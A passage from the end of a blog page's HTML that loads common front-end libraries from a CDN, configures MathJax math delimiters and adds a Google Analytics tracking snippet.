} if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script> /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */ MathJax = { tex: { inlineMath: [ /* start/end delimiter pairs for in-line math */ ['$','$'], ['\\(','\\)'] ], displayMath: [ /* start/end delimiter pairs for display math */ ['$$', '$$'], ['\\[', '\\]'] ] } }; </script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript" id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"> </script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-MNBEPZZWGS"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-MNBEPZZWGS'); }); </script>
